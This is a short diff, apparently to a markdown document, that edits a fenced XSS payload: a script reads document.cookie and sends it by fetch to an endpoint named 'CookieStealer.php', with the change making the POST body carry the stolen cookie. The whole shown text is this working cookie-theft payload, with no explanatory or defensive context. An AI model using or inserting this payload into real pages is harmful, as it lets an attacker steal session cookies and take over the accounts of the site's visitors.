@@ -3,12 +3,12 @@
 ```
 <script>
 const data=document.cookie;
-fetch('cookies.php?c='+data,{
+fetch('CookieStealer.php',{
   method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: "foo",
+  headers:{
+  'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'cookie='+data,
 })
 </script>
 ```
+
